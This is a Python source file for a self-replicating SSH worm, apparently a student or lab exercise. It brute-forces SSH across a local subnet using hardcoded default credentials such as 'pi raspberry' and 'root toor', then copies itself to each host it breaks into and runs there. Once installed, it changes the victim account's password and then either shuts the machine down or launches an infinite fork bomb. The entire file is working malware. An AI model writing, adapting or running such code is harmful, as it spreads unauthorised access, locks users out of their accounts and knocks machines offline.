#!/usr/bin/env python
"""
Program worm should first:
1- change password of current machine
2- create IP range list, 
3- try to ssh to devices within the IP range using list of user credentials
4- copy itself on ssh success
5- run the python there
6- shutdown current machine
"""

import paramiko
import sys
import os
import socket
import subprocess
import getpass

ip_range = []

user_credentials_list = [
    "root root",
    "admin admin",
    "pi raspberry",
    "root abc",
    "root toor",
    "abc abc",
    "admin password",
]

password_change_failed = False

""" 
A function that creates IP addresses and adds them to the ip_range list in the range
from 192.168.137.2 - 192.168.137.254
"""
def generate_IP_list():
    for i in range(143, 144): 
        ip = "192.168.137." + str(i)
        ip_range.append(ip)


"""
A function that iterates through the IP range and tries to SSH into each IP using the credentials in the user_credentials_list
"""
def start_ssh_devices():

    for ip in ip_range:
        print("\nTrying to ssh to Host : ", ip)
        print("\n--------------------------------\n")
        
        try:
            original_host_name = socket.gethostname() # the host generated from the built in function
            host_name_by_ip = socket.gethostbyaddr(ip) # host generated from the IP address
            network_host_name = host_name_by_ip[0].replace(".mshome.net", "") # get the machine name and remove .mshome.net (added by the IP scanning program)
            print("Hostname :  ",original_host_name) 
            print("Second host", network_host_name)
            if original_host_name == network_host_name:
                print ("Skip running the SSH scan on myself")
                continue

        except Exception:
            print("Host not found so skip the rest")
            continue

        ssh_connection = paramiko.SSHClient()

        ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())


        for credential in user_credentials_list:

            username_password = credential.split()
            username = username_password[0]
            password = username_password[1]

            try:
                print(
                    "Trying to ssh in with username :",
                    username,
                    " and password: ",
                    password,
                )
                ssh_connection.connect(ip, username=username, password=password, timeout=1) # changed timeout to 1 instead of 10
                
                print("SSH to host ", ip, " succeeded! I am inside hahaha!!!")

                copy_worm_excute(ssh_connection, password)
                break

            except Exception:
                print("SSH to host ", ip, " failed...")
            


"""
A function that copies the worm file to the other device via ssh connection and run it there
"""
def copy_worm_excute(ssh_connx,passwd):

    worm_file = "sleepingWormy.py"

    print("Copying worm and excuting it now")

    ssh_sftp = ssh_connx.open_sftp()
    ssh_sftp.put(worm_file, "/" + worm_file) # copy file to ssh'ed machine

    ssh_connx.exec_command("python /" + worm_file + " 1 "+passwd)
    ssh_connx.close()


"""
A function that changes the user account's password, if the function fails to change the password then call infinite fork
"""
def change_password_attack(current_password):

    try:
        usr = getpass.getuser()
        new_password = 'pikabuu'

        p = subprocess.Popen(('openssl', 'passwd', '-1', new_password), stdout=subprocess.PIPE)
        shadow_password = p.communicate()[0].strip()

        if p.returncode != 0:
            print ('Error creating hash for ', usr)

        command = 'usermod -p '+shadow_password+' '+usr

        p = os.system('echo %s|sudo -S %s' % (current_password, command))
    
    except Exception:
        password_change_failed = True


"""
A function that infinitely fork the process
"""
def infinite_fork():
    while True:
        pid = os.fork()


"""
A function that is called when the worm finishes copying itself to other devices. 
The function simply runs a command to shutdown the current machine
"""
def shutdown_device ():
    subprocess.call("sudo shutdown -h now", shell=True)


if __name__ == "__main__":

    # the if statement below is to prevent the worm from harming my personal laptop, so it won't attack it but will ssh to other devices
    if len(sys.argv) > 1:

        if sys.argv[1] == "1":
            if len(sys.argv) == 3: # if password is passed in the arguments then change password
                change_password_attack(sys.argv[2])
            else: # otherwise
                password_change_failed = True

        generate_IP_list()
        start_ssh_devices()

        if sys.argv[1] == "1":
            if not password_change_failed: # if password is changed then shutdown
                shutdown_device()
            else: # otherwise fork processes
                infinite_fork()
